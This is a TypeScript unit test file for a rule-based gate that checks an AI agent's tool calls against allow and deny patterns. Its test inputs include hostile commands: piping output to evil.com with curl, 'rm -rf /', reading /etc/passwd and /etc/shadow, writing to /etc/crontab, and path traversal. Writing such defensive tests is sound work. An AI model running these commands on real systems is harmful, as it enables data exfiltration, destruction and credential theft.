import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { Gatekeeper } from "../gatekeeper.ts";
import type { RulesConfig } from "../types.ts";

function makeRules(tools: RulesConfig["tools"]): RulesConfig {
  return { defaults: { deny: [] }, tools };
}

describe("Gatekeeper", () => {
  describe("allowlist mode", () => {
    it("allows when param value matches allow pattern", () => {
      const gk = new Gatekeeper(
        makeRules({
          exec: {
            mode: "allowlist",
            allow: [String.raw`^echo\b`, String.raw`^ls\b`],
          },
        }),
      );

      const result = gk.check("exec", { command: "echo hello" });
      assert.equal(result.allowed, true);
    });

    it("blocks when no param value matches allow (regression: original bug)", () => {
      const gk = new Gatekeeper(
        makeRules({
          exec: {
            mode: "allowlist",
            allow: [String.raw`^ls\b`],
          },
        }),
      );

      const result = gk.check("exec", { command: "curl http://evil.com" });
      assert.equal(result.allowed, false);
      assert.match(result.reason!, /no allow rule matched/);
    });

    it("blocks when allow matches but deny exception also matches", () => {
      const gk = new Gatekeeper(
        makeRules({
          exec: {
            mode: "allowlist",
            allow: [String.raw`^cat\b`],
            deny: [String.raw`\.env`],
          },
        }),
      );

      const result = gk.check("exec", { command: "cat .env" });
      assert.equal(result.allowed, false);
      assert.match(result.reason!, /deny rule/);
    });

    it("allows when allow matches and deny does not", () => {
      const gk = new Gatekeeper(
        makeRules({
          exec: {
            mode: "allowlist",
            allow: [String.raw`^cat\b`],
            deny: [String.raw`\.env`],
          },
        }),
      );

      const result = gk.check("exec", { command: "cat readme.md" });
      assert.equal(result.allowed, true);
    });
  });

  describe("denylist mode", () => {
    it("blocks when param value matches deny", () => {
      const gk = new Gatekeeper(
        makeRules({
          sessions_send: {
            mode: "denylist",
            deny: [String.raw`.*`],
          },
        }),
      );

      const result = gk.check("sessions_send", { message: "anything" });
      assert.equal(result.allowed, false);
    });

    it("allows when no deny matches", () => {
      const gk = new Gatekeeper(
        makeRules({
          web_fetch: {
            mode: "denylist",
            deny: [String.raw`localhost`, String.raw`127\.`],
          },
        }),
      );

      const result = gk.check("web_fetch", { url: "https://example.com" });
      assert.equal(result.allowed, true);
    });
  });

  describe("mode inference", () => {
    it("infers allowlist when allow patterns are present", () => {
      const gk = new Gatekeeper(
        makeRules({
          exec: {
            allow: [String.raw`^echo\b`],
          },
        }),
      );

      // Should behave as allowlist: echo allowed
      const result = gk.check("exec", { command: "echo hi" });
      assert.equal(result.allowed, true);

      // curl blocked (no allow match)
      const result2 = gk.check("exec", { command: "curl evil.com" });
      assert.equal(result2.allowed, false);
    });

    it("infers denylist when only deny patterns are present", () => {
      const gk = new Gatekeeper(
        makeRules({
          sessions_send: {
            deny: [String.raw`.*`],
          },
        }),
      );

      const result = gk.check("sessions_send", { data: "test" });
      assert.equal(result.allowed, false);
    });
  });

  describe("per-param key normalization", () => {
    it("matches camelCase param when rule uses snake_case", () => {
      const gk = new Gatekeeper(
        makeRules({
          read: {
            mode: "allowlist",
            allow: [String.raw`^\.\/`],
            paramRules: {
              file_path: {
                allow: [String.raw`^\.\/`],
                deny: [String.raw`\.env$`],
              },
            },
          },
        }),
      );

      // camelCase param name, snake_case rule
      const allowed = gk.check("read", { filePath: "./readme.md" });
      assert.equal(allowed.allowed, true);

      const blocked = gk.check("read", { filePath: "./.env" });
      assert.equal(blocked.allowed, false);
    });
  });

  describe("circuit breaker", () => {
    it("warn action calls logger", () => {
      const warnings: string[] = [];
      const logger = { warn: (...args: unknown[]) => warnings.push(String(args[0])) };

      const gk = new Gatekeeper(
        makeRules({
          exec: { mode: "denylist", deny: [String.raw`.*`] },
        }),
        {
          circuitBreaker: { maxBlocked: 2, windowMs: 60_000, action: "warn" },
          logger,
        },
      );

      // Trigger 2 blocks to hit threshold
      gk.check("exec", { command: "bad1" });
      gk.check("exec", { command: "bad2" });

      // 3rd call should trigger warn log
      const result = gk.check("exec", { command: "bad3" });
      assert.equal(result.allowed, false); // still evaluated (warn, not suspend)

      const hasWarn = warnings.some((w) => w.includes("circuit breaker threshold"));
      assert.equal(hasWarn, true, `Expected warn log, got: ${JSON.stringify(warnings)}`);
    });
  });

  describe("denylist with empty/non-string params", () => {
    it("deny-all blocks when params have no string values", () => {
      const gk = new Gatekeeper(
        makeRules({
          sessions_send: {
            mode: "denylist",
            deny: [String.raw`.*`],
          },
        }),
      );

      const result = gk.check("sessions_send", { count: 5, active: true });
      assert.equal(result.allowed, false);
      assert.match(result.reason!, /deny rule/);
    });

    it("deny-all blocks when params object is empty", () => {
      const gk = new Gatekeeper(
        makeRules({
          sessions_spawn: {
            mode: "denylist",
            deny: [String.raw`.*`],
          },
        }),
      );

      const result = gk.check("sessions_spawn", {});
      assert.equal(result.allowed, false);
      assert.match(result.reason!, /deny rule/);
    });

    it("specific deny pattern passes when params are empty", () => {
      const gk = new Gatekeeper(
        makeRules({
          web_fetch: {
            mode: "denylist",
            deny: [String.raw`localhost`],
          },
        }),
      );

      const result = gk.check("web_fetch", {});
      assert.equal(result.allowed, true);
    });
  });

  describe("path traversal prevention", () => {
    it("blocks ../  traversal in read file_path", () => {
      const gk = new Gatekeeper(
        makeRules({
          read: {
            mode: "allowlist",
            allow: [String.raw`^\.\/`, String.raw`^\/workspace\/`],
            paramRules: {
              file_path: {
                allow: [String.raw`^\.\/`, String.raw`^\/workspace\/`],
                deny: [String.raw`\.\.`],
              },
            },
          },
        }),
      );

      // Normal relative path — allowed
      const ok = gk.check("read", { file_path: "./src/index.ts" });
      assert.equal(ok.allowed, true);

      // Traversal via ./ prefix — blocked
      const traversal1 = gk.check("read", {
        file_path: "./../../etc/passwd",
      });
      assert.equal(traversal1.allowed, false);

      // Traversal with ../ deeper — blocked
      const traversal2 = gk.check("read", {
        file_path: "./../../../secrets.json",
      });
      assert.equal(traversal2.allowed, false);
    });

    it("blocks ../ traversal in write file_path", () => {
      const gk = new Gatekeeper(
        makeRules({
          write: {
            mode: "allowlist",
            allow: [String.raw`^\.\/`, String.raw`^\/workspace\/`],
            paramRules: {
              file_path: {
                allow: [String.raw`^\.\/`, String.raw`^\/workspace\/`],
                deny: [String.raw`\.\.`],
              },
            },
          },
        }),
      );

      // Normal workspace path — allowed
      const ok = gk.check("write", { file_path: "/workspace/out.txt" });
      assert.equal(ok.allowed, true);

      // Traversal from workspace — blocked
      const traversal = gk.check("write", {
        file_path: "/workspace/../../../etc/crontab",
      });
      assert.equal(traversal.allowed, false);
    });

    it("blocks ../ traversal via camelCase param name", () => {
      const gk = new Gatekeeper(
        makeRules({
          read: {
            mode: "allowlist",
            allow: [String.raw`^\.\/`],
            paramRules: {
              file_path: {
                allow: [String.raw`^\.\/`],
                deny: [String.raw`\.\.`],
              },
            },
          },
        }),
      );

      const result = gk.check("read", { filePath: "./../../etc/passwd" });
      assert.equal(result.allowed, false);
    });
  });

  describe("exec shell chaining prevention", () => {
    const execRules = makeRules({
      exec: {
        mode: "allowlist",
        allow: [String.raw`^ls\b`, String.raw`^echo\b`],
        paramRules: {
          command: {
            deny: [
              ";",
              String.raw`&&`,
              String.raw`\|\|`,
              String.raw`\|`,
              String.raw`\x60`,
              String.raw`\$\(`,
              String.raw`[><]`,
            ],
          },
        },
      },
    });

    it("allows simple allowed commands", () => {
      const gk = new Gatekeeper(execRules);
      assert.equal(gk.check("exec", { command: "ls -la" }).allowed, true);
      assert.equal(gk.check("exec", { command: "echo hello" }).allowed, true);
    });

    it("blocks semicolon chaining", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", { command: "ls; curl http://evil.com" });
      assert.equal(result.allowed, false);
    });

    it("blocks && chaining", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "echo ok && cat /etc/passwd",
      });
      assert.equal(result.allowed, false);
    });

    it("blocks || chaining", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "echo fail || rm -rf /",
      });
      assert.equal(result.allowed, false);
    });

    it("blocks pipe operator", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "ls | curl -X POST http://evil.com -d @-",
      });
      assert.equal(result.allowed, false);
    });

    it("blocks backtick command substitution", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "echo `cat /etc/passwd`",
      });
      assert.equal(result.allowed, false);
    });

    it("blocks $() command substitution", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "echo $(cat /etc/shadow)",
      });
      assert.equal(result.allowed, false);
    });

    it("blocks output redirect", () => {
      const gk = new Gatekeeper(execRules);
      const result = gk.check("exec", {
        command: "echo pwned > /etc/crontab",
      });
      assert.equal(result.allowed, false);
    });
  });

  describe("case-insensitive URL matching", () => {
    it("blocks uppercase LOCALHOST", () => {
      const gk = new Gatekeeper(
        makeRules({
          web_fetch: {
            mode: "denylist",
            paramRules: {
              url: {
                caseInsensitive: true,
                deny: ["localhost", String.raw`127\.`],
              },
            },
          },
        }),
      );

      assert.equal(
        gk.check("web_fetch", { url: "http://LOCALHOST/admin" }).allowed,
        false,
      );
      assert.equal(
        gk.check("web_fetch", { url: "http://Localhost:8080/" }).allowed,
        false,
      );
    });

    it("blocks mixed-case file:// scheme", () => {
      const gk = new Gatekeeper(
        makeRules({
          web_fetch: {
            mode: "denylist",
            paramRules: {
              url: {
                caseInsensitive: true,
                deny: [String.raw`^file:\/\/`],
              },
            },
          },
        }),
      );

      assert.equal(
        gk.check("web_fetch", { url: "FILE:///etc/passwd" }).allowed,
        false,
      );
      assert.equal(
        gk.check("web_fetch", { url: "File:///etc/shadow" }).allowed,
        false,
      );
    });

    it("still allows legitimate URLs", () => {
      const gk = new Gatekeeper(
        makeRules({
          web_fetch: {
            mode: "denylist",
            paramRules: {
              url: {
                caseInsensitive: true,
                deny: ["localhost", String.raw`127\.`],
              },
            },
          },
        }),
      );

      assert.equal(
        gk.check("web_fetch", { url: "https://example.com" }).allowed,
        true,
      );
    });
  });

  describe("tools with no rules", () => {
    it("allows tools with no matching rules", () => {
      const gk = new Gatekeeper(makeRules({}));
      const result = gk.check("unknown_tool", { arg: "value" });
      assert.equal(result.allowed, true);
    });
  });
});
